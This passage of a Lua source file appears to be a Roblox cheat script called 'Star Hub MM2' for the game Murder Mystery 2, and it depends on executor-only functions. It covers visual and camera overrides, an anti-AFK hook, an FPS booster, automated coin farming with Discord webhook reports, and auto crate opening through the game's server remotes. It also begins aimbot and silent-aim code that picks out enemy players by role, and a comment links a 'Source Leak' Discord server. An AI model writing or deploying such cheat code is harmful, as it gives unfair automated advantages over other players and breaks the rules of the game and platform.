		"FogStart",
	}

	local tbl50 = { "Density", "Color", "Decay", "Haze", "Glare" }

	local function func113()
		local tbl51 = {}
		local worldTime = _G.WorldTime

		if worldTime == "Day" then
			tbl51.ClockTime = 14
		elseif worldTime == "Sunset" then
			tbl51.ClockTime = 17.7
		elseif worldTime == "Night" then
			tbl51.ClockTime = 0
			tbl51.Brightness = 0.6
			tbl51.Ambient = color(35, 35, 60)
			tbl51.OutdoorAmbient = color(45, 45, 85)
		end

		if _G.WorldFullbright then
			tbl51.Ambient = color(170, 170, 170)
			tbl51.OutdoorAmbient = color(170, 170, 170)
			tbl51.GlobalShadows = false

			if worldTime ~= "Night" then
				tbl51.Brightness = 2.5
			end
		end

		if _G.WorldNoFog then
			tbl51.FogStart = 1000000
			tbl51.FogEnd = 1000000
		end

		for _, item47 in ipairs(tbl49) do
			func109(Lighting, item47, tbl51[item47])
		end

		local entry16 = tbl47[_G.WorldSky]
		local list26 = {}

		for _, child in ipairs(Lighting:GetChildren()) do
			if child:IsA("Atmosphere") and not child:GetAttribute("MarbegKeep") then
				list26[#list26 + 1] = child
			end
		end

		if entry16 and #list26 == 0 then
			local Atmosphere = func111("Atmosphere", "MarbegAtmosphere")
			Atmosphere.Offset = 0.2
			list26[1] = Atmosphere
		else
			func112("MarbegAtmosphere")
		end

		for _, item48 in ipairs(list26) do
			local tbl52 = {}

			if entry16 then
				for k, value101 in pairs(entry16) do
					tbl52[k] = value101
				end

				tbl52.Density = (_G.WorldNoFog or _G.WorldTime == "Night") and 0.12 or 0.22
			elseif _G.WorldNoFog then
				tbl52.Density = 0
				tbl52.Haze = 0
			end

			for _, item49 in ipairs(tbl50) do
				func109(item48, item49, tbl52[item49])
			end
		end

		if _G.WorldColor then
			local ColorCorrectionEffect = func111("ColorCorrectionEffect", "MarbegColor")
			ColorCorrectionEffect.Saturation = _G.WorldSaturation
			ColorCorrectionEffect.Contrast = _G.WorldContrast
			ColorCorrectionEffect.Brightness = _G.WorldBrightness
			ColorCorrectionEffect.TintColor = _G.WorldTint
			ColorCorrectionEffect.Enabled = true
		else
			func112("MarbegColor")
		end

		if _G.WorldBloom then
			local BloomEffect = func111("BloomEffect", "MarbegBloom")
			BloomEffect.Intensity = _G.WorldBloomIntensity
			BloomEffect.Size = 28
			BloomEffect.Threshold = 0.9
			BloomEffect.Enabled = true
		else
			func112("MarbegBloom")
		end
	end

	_G.WorldVisualsApply = function()
		pcall(func113)
	end

	local connection2 = Lighting.ChildAdded:Connect(function(child)
		if child:IsA("Atmosphere") then
			task.defer(_G.WorldVisualsApply)
		end
	end)

	table.insert(_G.CoinESPConn, connection2)

	_G.WorldVisualsReset = function()
		connection2:Disconnect()

		for k in pairs(tbl48) do
			func110(k)
		end

		func112("MarbegAtmosphere")
		func112("MarbegColor")
		func112("MarbegBloom")
	end
end

do
	local function func114(param78, callback1)
		return function(param79)
			_G[param78] = callback1 and callback1(param79) or param79
			_G.WorldVisualsApply()
		end
	end

	local function func115(flag134)
		return flag134 and true or false
	end

	_G.WorldSetTime = func114("WorldTime")
	_G.WorldSetFullbright = func114("WorldFullbright", func115)
	_G.WorldSetNoFog = func114("WorldNoFog", func115)
	_G.WorldSetSky = func114("WorldSky")
	_G.WorldSetColor = func114("WorldColor", func115)
	_G.WorldSetSaturation = func114("WorldSaturation", tonumber)
	_G.WorldSetContrast = func114("WorldContrast", tonumber)
	_G.WorldSetBrightness = func114("WorldBrightness", tonumber)
	_G.WorldSetTint = func114("WorldTint")
	_G.WorldSetBloom = func114("WorldBloom", func115)
	_G.WorldSetBloomIntensity = func114("WorldBloomIntensity", tonumber)
end

do
	local ok, result = pcall(function()
		return require(ReplicatedStorage.Database.Sync)
	end)

	local emoteList = {}

	if ok and type(result) == "table" and type(result.Emotes) == "table" then
		for k, emote in pairs(result.Emotes) do
			if type(emote) == "table" and emote.AnimationID then
				emoteList[#emoteList + 1] = k
			end
		end
	end

	table.sort(emoteList)
	_G.EmoteList = emoteList

	_G.PlayEmote = function(param80)
		local playEmote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Misc") and ReplicatedStorage.Remotes.Misc:FindFirstChild("PlayEmote")
		if not playEmote then
			return false, "Emote event unavailable"
		end
		playEmote:Fire(param80)
		return true, param80
	end

	_G.StopEmotes = function()
		local character = localPlayer.Character
		character = character and character:FindFirstChildWhichIsA("Humanoid")
		character = character and character:FindFirstChildWhichIsA("Animator")
		if not character then
			return false, "No character"
		end
		local byName2 = {}

		for _, item50 in ipairs(emoteList) do
			byName2[item50] = true
		end

		local n2 = 0

		for _, getPlayingAnimationTrack in ipairs(character:GetPlayingAnimationTracks()) do
			if byName2[getPlayingAnimationTrack.Name] then
				getPlayingAnimationTrack:Stop(0.2)
				n2 += 1
			end
		end

		return true, n2 > 0 and "Stopped" or "Nothing playing"
	end
end

_G.CameraFOVEnabled = false
_G.CameraFOV = 80
_G.CameraZoomEnabled = false
_G.CameraMaxZoom = 40

do
	local fieldOfView = nil
	local cameraMaxZoomDistance = nil

	local function func116()
		pcall(function()
			RunService:UnbindFromRenderStep("MarbegCameraFOV")
		end)

		local currentCamera = workspace.CurrentCamera

		if _G.CameraFOVEnabled then
			if fieldOfView == nil and currentCamera then
				fieldOfView = currentCamera.FieldOfView
			end

			RunService:BindToRenderStep("MarbegCameraFOV", Enum.RenderPriority.Camera.Value + 4, function()
				local currentCamera2 = workspace.CurrentCamera

				if currentCamera2 and not _G.__KillCamActive and not _G.StretchModeEnabled then
					currentCamera2.FieldOfView = _G.CameraFOV
				end
			end)
		elseif fieldOfView ~= nil then
			if currentCamera then
				pcall(function()
					currentCamera.FieldOfView = fieldOfView
				end)
			end

			fieldOfView = nil
		end
	end

	local connection2 = nil

	local function func117()
		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if _G.CameraZoomEnabled then
			if cameraMaxZoomDistance == nil then
				cameraMaxZoomDistance = localPlayer.CameraMaxZoomDistance
			end

			localPlayer.CameraMaxZoomDistance = _G.CameraMaxZoom

			connection2 = localPlayer:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(function()
				if math.abs(localPlayer.CameraMaxZoomDistance - _G.CameraMaxZoom) > 0.01 then
					cameraMaxZoomDistance = localPlayer.CameraMaxZoomDistance
					localPlayer.CameraMaxZoomDistance = _G.CameraMaxZoom
				end
			end)
			-- https://discord.gg/x7YbZeezpm | 𝐒𝐋 | 𝐒𝐨𝐮𝐫𝐜𝐞 𝐋𝐞𝐚𝐤

			table.insert(_G.CoinESPConn, connection2)
		elseif cameraMaxZoomDistance ~= nil then
			pcall(function()
				localPlayer.CameraMaxZoomDistance = cameraMaxZoomDistance
			end)

			cameraMaxZoomDistance = nil
		end
	end

	_G.CameraSetFOVEnabled = function(flag135)
		_G.CameraFOVEnabled = flag135 and true or false
		func116()
	end

	_G.CameraSetFOV = function(param81)
		_G.CameraFOV = math.clamp(tonumber(param81) or 80, 30, 120)
	end

	_G.CameraSetZoomEnabled = function(flag136)
		_G.CameraZoomEnabled = flag136 and true or false
		func117()
	end

	_G.CameraSetMaxZoom = function(param82)
		_G.CameraMaxZoom = math.clamp(tonumber(param82) or 40, 15, 400)

		if _G.CameraZoomEnabled then
			func117()
		end
	end

	_G.CameraSettingsReset = function()
		local value102 = _G
		_G.CameraFOVEnabled = false
		value102.CameraZoomEnabled = false
		func116()
		func117()
	end
end

_G.KillCamEnabled = false
_G.KillCamDuration = 1.4

do
	local n2 = 0
	_G.__KillCamActive = false

	local function func118(param83)
		if _G.__KillCamActive or _G.KillAllBusy or os.clock() - n2 < 3 then
			return
		end
		local position = param83.position
		local currentCamera = workspace.CurrentCamera
		if not position or not currentCamera then
			return
		end
		_G.__KillCamActive = true
		n2 = os.clock()
		local cameraType = currentCamera.CameraType
		local fieldOfView = currentCamera.FieldOfView
		local killCamDuration = _G.KillCamDuration or 1.4
		local roleColors = _G.__RoleColors and _G.__RoleColors[param83.role] or Color3.new(1, 1, 1)
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "MarbegKillCam"
		screenGui.IgnoreGuiInset = true
		screenGui.DisplayOrder = 30
		screenGui.Parent = func2()
		local list27 = {}

		for _, item51 in ipairs({ true, false }) do
			local frame = Instance.new("Frame")
			frame.AnchorPoint = Vector2.new(0, item51 and 1 or 0)
			frame.Position = UDim2.fromScale(0, item51 and 0 or 1)
			frame.Size = UDim2.new(1, 0, 0.11, 0)
			frame.BackgroundColor3 = Color3.new(0, 0, 0)
			frame.BorderSizePixel = 0
			frame.Parent = screenGui
			list27[#list27 + 1] = { frame = frame, top = item51 }
			local value103 = TweenService
			local create = value103.Create
			local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad)
			local tbl53 = {}
			local vector2 = Vector2.new
			item51 = item51 and 0 or 1
			tbl53.AnchorPoint = vector2(0, item51)
			create(value103, frame, tweenInfo, tbl53):Play()
		end

		local textLabel = Instance.new("TextLabel")
		textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
		textLabel.Position = UDim2.fromScale(0.5, 0.945)
		textLabel.Size = UDim2.fromOffset(500, 30)
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.GothamBlack
		textLabel.TextSize = 20
		textLabel.TextColor3 = roleColors
		textLabel.TextStrokeTransparency = 0.4
		textLabel.Text = string.upper(param83.name or "")
		textLabel.Parent = screenGui
		local colorCorrectionEffect = Instance.new("ColorCorrectionEffect")
		colorCorrectionEffect.Name = "MarbegKillCamGrade"
		colorCorrectionEffect.Saturation = 0
		colorCorrectionEffect.Parent = game:GetService("Lighting")
		TweenService:Create(colorCorrectionEffect, TweenInfo.new(0.3), { Saturation = -0.45, Contrast = 0.2 }):Play()
		local n3 = (currentCamera.CFrame.Position - position) * Vector3.new(1, 0, 1)
		local n4 = n3.Magnitude > 0.1 and math.atan2(n3.Z, n3.X) or 0
		currentCamera.CameraType = Enum.CameraType.Scriptable
		local now = os.clock()
		local flag137 = false
		local connection2 = nil

		connection2 = RunService.RenderStepped:Connect(function()
			local n5 = math.clamp((os.clock() - now) / killCamDuration, 0, 1)
			local n6 = 1 - (1 - n5) ^ 3
			local n7 = n4 + 1.2217304763960306 * n6
			local n8 = 11 - 4 * n6
			currentCamera.CFrame = CFrame.lookAt(position + Vector3.new(math.cos(n7) * n8, 2.5 + 1.5 * (1 - n6), math.sin(n7) * n8), position + Vector3.new(0, 0.5, 0))
			currentCamera.FieldOfView = fieldOfView - 18 * n6

			if n5 >= 1 and not flag137 then
				flag137 = true
				connection2:Disconnect()
			end
		end)

		task.delay(killCamDuration, function()
			if connection2.Connected then
				connection2:Disconnect()
			end

			pcall(function()
				currentCamera.CameraType = cameraType == Enum.CameraType.Scriptable and Enum.CameraType.Custom or cameraType
				currentCamera.FieldOfView = fieldOfView
				local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildWhichIsA("Humanoid")

				if humanoid then
					currentCamera.CameraSubject = humanoid
				end
			end)

			TweenService:Create(colorCorrectionEffect, TweenInfo.new(0.3), { Saturation = 0, Contrast = 0 }):Play()

			for _, item52 in ipairs(list27) do
				TweenService:Create(item52.frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), { AnchorPoint = Vector2.new(0, item52.top and 1 or 0) }):Play()
			end

			TweenService:Create(textLabel, TweenInfo.new(0.25), { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()

			task.delay(0.35, function()
				pcall(function()
					screenGui:Destroy()
				end)

				pcall(function()
					colorCorrectionEffect:Destroy()
				end)

				_G.__KillCamActive = false
			end)
		end)
	end

	_G.__MyKillListeners = _G.__MyKillListeners or {}

	_G.__MyKillListeners.KillCam = function(param84)
		if _G.KillCamEnabled then
			task.spawn(func118, param84)
		end
	end
end

_G.KillCamSetEnabled = function(flag138)
	_G.KillCamEnabled = flag138 and true or false
end

_G.KillCamSetDuration = function(param85)
	_G.KillCamDuration = math.clamp(tonumber(param85) or 1.4, 0.6, 3)
end

_G.StretchModeEnabled = false
_G.StretchAspect = 1.3333333333333333

do
	local fieldOfView = nil

	local function func119()
		pcall(function()
			RunService:UnbindFromRenderStep("MarbegStretchFOV")
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera and fieldOfView then
			pcall(function()
				currentCamera.FieldOfView = fieldOfView
			end)
		end

		fieldOfView = nil
	end

	_G.StretchModeSetEnabled = function(flag139)
		_G.StretchModeEnabled = flag139 and true or false
		func119()
		if not _G.StretchModeEnabled then
			return
		end
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		fieldOfView = currentCamera.FieldOfView

		RunService:BindToRenderStep("MarbegStretchFOV", Enum.RenderPriority.Camera.Value + 5, function()
			local currentCamera2 = workspace.CurrentCamera
			local cameraFOV = _G.CameraFOVEnabled and _G.CameraFOV or fieldOfView
			if not currentCamera2 or not cameraFOV or _G.__KillCamActive then
				return
			end
			local viewportSize = currentCamera2.ViewportSize
			if viewportSize.Y <= 0 then
				return
			end
			local n2 = viewportSize.X / viewportSize.Y
			local n3 = math.clamp(tonumber(_G.StretchAspect) or 1.3333333333333333, 1, n2)
			currentCamera2.FieldOfView = math.clamp(math.deg(2 * math.atan(math.tan(2 * math.atan(math.tan(math.rad(cameraFOV) / 2) * n3) / 2) / n2)), 1, 120)
		end)
	end
end

_G.StretchModeSetAspect = function(param86)
	_G.StretchAspect = math.clamp(tonumber(param86) or 1.3333333333333333, 1, 2.4)
end

_G.AntiAfkEnabled = true

_G.AntiAfkSetEnabled = function(flag140)
	_G.AntiAfkEnabled = flag140 and true or false
end

if not _G.__AntiAfkHooked then
	_G.__AntiAfkHooked = true
	local VirtualUser = game:GetService("VirtualUser")

	localPlayer.Idled:Connect(function()
		if not _G.AntiAfkEnabled then
			return
		end

		pcall(function()
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end)
end

do
	local Lighting = game:GetService("Lighting")
	local obj = setmetatable({}, { __mode = "k" })
	local connection2 = nil
	_G.FpsBoostEnabled = false
	_G.FpsCapValue = 0

	local function func120(tbl54, param87)
		local entry17 = obj[tbl54]

		if not entry17 then
			entry17 = {}
			obj[tbl54] = entry17
		end

		if entry17[param87] == nil then
			local ok, result = pcall(function()
				return tbl54[param87]
			end)

			if ok then
				entry17[param87] = result
			end
		end
	end

	local function func121(instance19)
		if instance19:GetAttribute("MarbegKeep") then
			return
		end

		if instance19:IsA("ParticleEmitter") or instance19:IsA("Trail") or instance19:IsA("Beam") or instance19:IsA("Smoke") or instance19:IsA("Fire") or instance19:IsA("Sparkles") then
			func120(instance19, "Enabled")
			instance19.Enabled = false
		elseif instance19:IsA("PostEffect") then
			func120(instance19, "Enabled")
			instance19.Enabled = false
		elseif instance19:IsA("Decal") or instance19:IsA("Texture") then
			func120(instance19, "Transparency")
			instance19.Transparency = 1
		elseif instance19:IsA("MeshPart") and instance19.TextureID ~= "" then
			func120(instance19, "TextureID")
			instance19.TextureID = ""
		end
	end

	local function func122()
		pcall(function()
			func120(Lighting, "GlobalShadows")
			Lighting.GlobalShadows = false
			func120(Lighting, "FogEnd")
			Lighting.FogEnd = 1e9
		end)

		pcall(function()
			local terrain = workspace.Terrain

			if terrain then
				func120(terrain, "WaterWaveSize")
				terrain.WaterWaveSize = 0
				func120(terrain, "WaterWaveSpeed")
				terrain.WaterWaveSpeed = 0
				func120(terrain, "WaterReflectance")
				terrain.WaterReflectance = 0
				func120(terrain, "WaterTransparency")
				terrain.WaterTransparency = 0
			end
		end)

		pcall(function()
			local level01 = Enum.QualityLevel.Level01
			settings().Rendering.QualityLevel = level01
		end)

		for _, descendant in ipairs(Lighting:GetDescendants()) do
			pcall(func121, descendant)
		end

		local n2 = 0

		for _, descendant in ipairs(workspace:GetDescendants()) do
			if not _G.FpsBoostEnabled then
				return
			end
			pcall(func121, descendant)
			n2 += 1

			if n2 % 600 == 0 then
				RunService.Heartbeat:Wait()
			end
		end

		if connection2 then
			connection2:Disconnect()
		end

		connection2 = workspace.DescendantAdded:Connect(function(descendant)
			if _G.FpsBoostEnabled then
				task.defer(function()
					pcall(func121, descendant)
				end)
			end
		end)
	end

	local function func123()
		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		for k, value104 in pairs(obj) do
			for k2, value105 in pairs(value104) do
				pcall(function()
					k[k2] = value105
				end)
			end
		end

		table.clear(obj)

		pcall(function()
			local automatic = Enum.QualityLevel.Automatic
			settings().Rendering.QualityLevel = automatic
		end)
	end

	_G.FpsBoostSetEnabled = function(flag141)
		local fpsBoostEnabled = flag141 and true or false
		if fpsBoostEnabled == _G.FpsBoostEnabled then
			return
		end
		_G.FpsBoostEnabled = fpsBoostEnabled

		if fpsBoostEnabled then
			task.spawn(func122)
		else
			func123()
		end
	end
end

_G.FpsBoostSetCap = function(param88)
	local fpsCapValue = tonumber(param88) or 0
	_G.FpsCapValue = fpsCapValue

	pcall(function()
		if setfpscap then
			setfpscap(fpsCapValue)
		end
	end)
end

do
	local HttpService = game:GetService("HttpService")
	local flag142 = false
	local flag143 = false
	local now = os.clock()
	local n2 = 0
	local list28 = {}
	local flag144 = false
	local now2 = os.clock()
	local value106 = nil
	_G.FarmWebhookEnabled = false
	_G.FarmWebhookUrl = ""
	_G.FarmWebhookBagFull = true
	_G.FarmWebhookPeriodic = true
	_G.FarmWebhookInterval = 10

	local function func124(param89, param90)
		if type(request_) ~= "function" then
			return false, "HTTP request is not supported"
		end
		local value107 = param90

		if type(param90) ~= "string" then
			local ok, result = pcall(function()
				return HttpService:JSONEncode(param90)
			end)

			if not ok then
				return false, "encode failed"
			end
			value107 = result
		end

		local ok, result = pcall(request_, {
			Url = param89,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = "Roblox" },
			Body = value107,
		})

		if not ok then
			return false, tostring(result)
		end

		if type(result) == "table" then
			local num42 = tonumber(result.StatusCode or result.Status)
			if num42 and (num42 < 200 or num42 >= 300) then
				return false, "HTTP " .. tostring(num42)
			end
		end

		return true, "ok"
	end

	local function func125()
		local farmWebhookUrl = _G.FarmWebhookUrl
		return type(farmWebhookUrl) == "string" and farmWebhookUrl:match("^https?://[^%s]+$") ~= nil
	end

	local function func126()
		if flag144 then
			return
		end
		flag144 = true

		task.spawn(function()
			while #list28 > 0 do
				local n3 = 2 - os.clock() - n2

				if n3 > 0 then
					task.wait(n3)
				end

				local value108 = table.remove(list28, 1)
				n2 = os.clock()
				pcall(func124, _G.FarmWebhookUrl, value108)
			end

			flag144 = false
		end)
	end

	local function func127(param91)
		local n3 = math.floor((tonumber(param91) or 0) + 0.5)
		return (n3 < 0 and "-" or "") .. tostring(math.abs(n3)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
	end

	local function func128()
		local n3 = math.max(0, os.clock() - now2)
		local n4 = math.floor(n3 / 3600)
		local n5 = math.floor(n3 % 3600 / 60)
		if n4 > 0 then
			return string.format("%dh %dm", n4, n5)
		end

		if n5 > 0 then
			return string.format("%dm %ds", n5, math.floor(n3 % 60))
		end
		return string.format("%ds", math.floor(n3 % 60))
	end

	local function farmAccountStats()
		local n3 = nil
		local n4 = nil
		local value109 = nil

		pcall(function()
			local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
			local owned = ProfileData.Materials and ProfileData.Materials.Owned or {}
			n3 = tonumber(owned.Coins) or 0
			n4 = tonumber(owned.Gems) or 0
			local LevelModule = require(ReplicatedStorage.Modules.LevelModule)

			if LevelModule and LevelModule.GetLevel then
				value109 = LevelModule.GetLevel(ProfileData.NewXP or 0)
			end
		end)

		return n3, n4, value109
	end

	_G.__FarmAccountCoins = function()
		return (select(1, farmAccountStats()))
	end

	_G.__FarmAccountStats = farmAccountStats

	local function func129(param92, param93, flag145)
		local num43, flag146, flag147 = farmAccountStats()

		if value106 == nil then
			value106 = num43
		end

		local n3 = 0

		pcall(function()
			local value110
			value110, value110 = _G.FarmGetRates()
			n3 = value110
		end)

		local farmCoinsCollected = _G.FarmCoinsCollected or 0
		local n4 = num43 and value106 and num43 > value106 and num43 - value106 or nil
		local tbl55 = {}
		local tbl56 = { name = "👤 Player", value = "`" .. tostring(localPlayer.Name) .. "`", inline = true }
		local tbl57 = { name = "⭐ Level", value = "`" .. tostring(flag147 or "?") .. "`", inline = true }
		local tbl58 = { name = "🎟 Cases opened", value = "`" .. func127(_G.AutoCaseOpened or 0) .. "`", inline = true }
		local tbl59 = { name = "🪙 Coins", value = num43 and "**" .. func127(num43) .. "**" or "`?`", inline = true }
		local tbl60 = { name = "💎 Gems", value = "`" .. func127(flag146 or 0) .. "`", inline = true }
		local tbl61 = { name = "📈 Coins / hour", value = "`" .. func127(n3) .. "`", inline = true }

		local tbl62 = {
			name = "🌾 Farmed this session",
			value = "`" .. func127(farmCoinsCollected) .. "`" .. (n4 and "  ( `+" .. func127(n4) .. "` to balance )" or ""),
			inline = false,
		}

		local tbl63 = { name = "⏳ Runtime", value = "`" .. func128() .. "`", inline = true }
		tbl55[1] = tbl56
		tbl55[2] = tbl57
		tbl55[3] = tbl58
		tbl55[4] = tbl59
		tbl55[5] = tbl60
		tbl55[6] = tbl61
		tbl55[7] = tbl62
		tbl55[8] = tbl63

		local tbl64 = {
			author = { name = "Star Hub • MM2" },
			title = param92,
			description = param93,
			color = flag145 or 16758338,
			fields = tbl55,
		}

		tbl64.footer = { text = "Star Hub MM2  •  " .. tostring(_G.ScriptVersion) }

		pcall(function()
			tbl64.timestamp = DateTime.now():ToIsoDate()
		end)

		return tbl64
	end

	local function farmWebhookSend(param94, param95, param96)
		if not _G.FarmWebhookEnabled or not func125() then
			return
		end
		list28[#list28 + 1] = { username = "Star Hub MM2", embeds = { func129(param94, param95, param96) } }

		while #list28 > 12 do
			table.remove(list28, 1)
		end

		func126()
	end

	_G.FarmWebhookSend = farmWebhookSend

	_G.FarmWebhookSetEnabled = function(flag148)
		_G.FarmWebhookEnabled = flag148 and true or false
	end

	_G.FarmWebhookSetUrl = function(flag149)
		_G.FarmWebhookUrl = type(flag149) == "string" and flag149 or ""
	end

	_G.FarmWebhookTest = function()
		if not func125() then
			return false, "Paste a valid https:// webhook URL first."
		end
		local farmWebhookEnabled = _G.FarmWebhookEnabled
		_G.FarmWebhookEnabled = true
		farmWebhookSend("✅ Webhook test", "If this lands in your channel, the Star Hub farm webhook is wired up.", 5763719)
		_G.FarmWebhookEnabled = farmWebhookEnabled
		return true, "Test embed queued."
	end

	local farmWebhookLoopId = {}
	_G.__FarmWebhookLoopId = farmWebhookLoopId

	task.spawn(function()
		while _G.__FarmWebhookLoopId == farmWebhookLoopId do
			task.wait(1)

			if not _G.FarmWebhookEnabled then
				flag142 = _G.AutoFarmEnabled and true or false
				flag143 = _G.BagFull and true or false
			else
				local autoFarmEnabled4 = _G.AutoFarmEnabled and true or false

				if autoFarmEnabled4 ~= flag142 then
					flag142 = autoFarmEnabled4

					if autoFarmEnabled4 then
						now = os.clock()
						now2 = os.clock()
						value106 = select(1, farmAccountStats())
						farmWebhookSend("🟢 Farm started", "The coin farm is now running.", 3066993)
					else
						farmWebhookSend("🔴 Farm stopped", "The coin farm was switched off.", 15158332)
					end
				end

				if autoFarmEnabled4 then
					local bagFull3 = _G.BagFull and true or false

					if bagFull3 and not flag143 and _G.FarmWebhookBagFull then
						farmWebhookSend("💰 Coin bag full", "Bag filled up -- cashing in.", 16766720)
					end

					flag143 = bagFull3

					if _G.FarmWebhookPeriodic then
						local n3 = math.max(1, tonumber(_G.FarmWebhookInterval) or 10)

						if n3 * 60 <= os.clock() - now then
							now = os.clock()
							farmWebhookSend("⏱ Farm checkpoint", string.format("Still farming -- %d min checkpoint.", n3), 16758338)
						end
					end
				else
					flag143 = false
				end
			end
		end
	end)
end

_G.AutoCaseEnabled = false
_G.AutoCaseBox = "MysteryBox1"
_G.AutoCaseReserve = 0
_G.AutoCaseOnlyWhileFarming = true
_G.AutoCaseOpened = 0
_G.AutoCaseLastReward = nil
_G.AutoCaseStatus = "idle"
_G.FarmWebhookCaseReport = true
_G.AutoCaseBoxList = { "MysteryBox1", "MysteryBox2", "KnifeBox3", "KnifeBox4", "GunBox3" }

do
	local function func130()
		local value111 = nil

		pcall(function()
			local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
			value111 = tonumber(ProfileData.Materials and ProfileData.Materials.Owned and ProfileData.Materials.Owned.Coins)
		end)

		return value111
	end

	local function func131(param97)
		local n2 = 1000

		pcall(function()
			local NewShop = require(ReplicatedStorage.Database.Sync.NewShop)
			local coins = NewShop[param97] and NewShop[param97].Price and NewShop[param97].Price.Coins

			if tonumber(coins) then
				n2 = tonumber(coins)
			end
		end)

		return n2
	end

	local function autoCaseOpenOnce()
		local autoCaseBox = _G.AutoCaseBox

		if type(autoCaseBox) ~= "string" or autoCaseBox == "" then
			autoCaseBox = "MysteryBox1"
		end

		local ok, result = pcall(function()
			return ReplicatedStorage.Remotes.Shop.OpenCrate:InvokeServer(autoCaseBox, "MysteryBox", "Coins")
		end)

		if not ok then
			_G.AutoCaseStatus = "error: " .. tostring(result):sub(1, 48)
			return false
		end

		if not result then
			_G.AutoCaseStatus = "server refused the open"
			return false
		end

		pcall(function()
			ReplicatedStorage.Remotes.Shop.CrateComplete:FireServer(result)
		end)

		_G.AutoCaseOpened = (_G.AutoCaseOpened or 0) + 1
		_G.AutoCaseLastReward = tostring(result)
		_G.AutoCaseStatus = "opened #" .. tostring(result) .. "  (x" .. tostring(_G.AutoCaseOpened) .. ")"

		if _G.FarmWebhookCaseReport and _G.FarmWebhookSend then
			pcall(_G.FarmWebhookSend, "🎁 Case opened", string.format("Unboxed `#%s` from **%s**.", tostring(result), autoCaseBox), 10181046)
		end

		return true
	end

	_G.AutoCaseOpenOnce = autoCaseOpenOnce
	local autoCaseLoopId = {}
	_G.__AutoCaseLoopId = autoCaseLoopId

	task.spawn(function()
		while _G.__AutoCaseLoopId == autoCaseLoopId do
			task.wait(3)

			if _G.AutoCaseEnabled and (not _G.AutoCaseOnlyWhileFarming or _G.AutoFarmEnabled) then
				local result11 = func130()
				local n2 = math.max(0, tonumber(_G.AutoCaseReserve) or 0)
				local autoCaseBox2 = func131(_G.AutoCaseBox)

				if result11 and result11 - autoCaseBox2 >= n2 then
					_G.AutoCaseStatus = "opening " .. tostring(_G.AutoCaseBox) .. "..."
					autoCaseOpenOnce()
					task.wait(2)
				elseif result11 then
					_G.AutoCaseStatus = string.format("waiting: %d / %d coins", result11, autoCaseBox2 + n2)
				else
					_G.AutoCaseStatus = "coin balance unavailable"
				end
			end
		end
	end)
end

_G.AutoCaseSetEnabled = function(flag150)
	_G.AutoCaseEnabled = flag150 and true or false

	if not _G.AutoCaseEnabled then
		_G.AutoCaseStatus = "idle"
	end
end

_G.AutoCaseSetBox = function(autoCaseBox)
	if type(autoCaseBox) == "string" and autoCaseBox ~= "" then
		_G.AutoCaseBox = autoCaseBox
	end
end

_G.AutoCaseSetReserve = function(param98)
	_G.AutoCaseReserve = math.max(0, tonumber(param98) or 0)
end

_G.AutoCaseSetOnlyWhileFarming = function(flag151)
	_G.AutoCaseOnlyWhileFarming = flag151 and true or false
end

_G.AutoCaseSetWebhookReport = function(flag152)
	_G.FarmWebhookCaseReport = flag152 and true or false
end

_G.ShiftLockAimbotEnabled = false
_G.SilentAimEnabled = false
_G.SilentThrowEnabled = false

do
	local ok, result = pcall(function()
		return require(ReplicatedStorage:WaitForChild("ClientServices"):WaitForChild("WeaponService"))
	end)

	local tbl65 = { "UpperTorso", "HumanoidRootPart", "Torso", "LowerTorso", "Head" }

	local function func132(instance20)
		for _, item53 in ipairs(tbl65) do
			local obj29 = instance20:FindFirstChild(item53)
			if obj29 and obj29:IsA("BasePart") then
				return obj29
			end
		end

		return nil
	end

	local function aimEnemyHead()
		local flag153 = CurrentRoundClient.PlayerData[localPlayer.Name]
		if not flag153 or not flag153.Role or flag153.Dead then
			return nil
		end
		local tbl66

		if flag153.Role == "Murderer" then
			tbl66 = { Sheriff = true, Hero = true }
		else
			tbl66 = { Murderer = true }
		end

		for _, player in ipairs(Players:GetPlayers()) do
			if player == localPlayer then
				continue
			end
			local flag154 = CurrentRoundClient.PlayerData[player.Name]

			if flag154 and flag154.Role and tbl66[flag154.Role] and not flag154.Dead then
				local character = player.Character
				local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
				character = character and func132(character)
				if character and humanoid and humanoid.Health > 0 then
					return character
				end
			end
		end

		return nil
	end

	_G.__AimEnemyHead = aimEnemyHead

	local function func133()
		local character = localPlayer.Character
		if not character then
			return nil
		end

		for _, child in ipairs(character:GetChildren()) do
			if child:IsA("Tool") then
				local lowered5 = string.lower(child.Name)
				if string.find(lowered5, "knife", 1, true) then
					return "Knife"
				end

				if string.find(lowered5, "gun", 1, true) or string.find(lowered5, "revolver", 1, true) then
					return "Gun"
				end
				return "Other"
			end
		end

		return nil
	end

	local function silentThrowTarget()
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart then
			return nil
		end
		local huge = math.huge
		local value112 = nil
		local huge2 = math.huge
		local value113 = nil

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				local character2 = player.Character
				local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
				local flag155 = character2 and func132(character2)

				if flag155 and humanoid and humanoid.Health > 0 then
					local magnitude = (flag155.Position - humanoidRootPart.Position).Magnitude

					if magnitude < huge then
						huge = magnitude
						value112 = flag155
					end

					local raycastParams = RaycastParams.new()
					raycastParams.FilterType = Enum.RaycastFilterType.Exclude
					raycastParams.FilterDescendantsInstances = { character, character2 }
					raycastParams.IgnoreWater = true
